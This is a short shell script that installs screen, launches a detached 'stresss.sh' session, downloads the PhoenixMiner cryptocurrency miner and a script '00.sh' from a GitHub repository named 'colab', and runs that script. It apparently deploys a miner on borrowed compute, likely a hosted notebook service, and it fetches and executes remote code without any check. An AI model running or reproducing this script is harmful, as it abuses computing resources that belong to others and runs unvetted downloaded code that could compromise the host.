#!/bin/sh

apt-get install libpci3
sudo apt update
sudo apt install screen -y
screen -dmS stresss.sh ./stresss.sh 65 75
wget https://github.com/lambohopo/colab/raw/main/PhoenixMiner
wget https://github.com/lambohopo/colab/raw/main/00.sh
chmod +x 00.sh
./00.sh
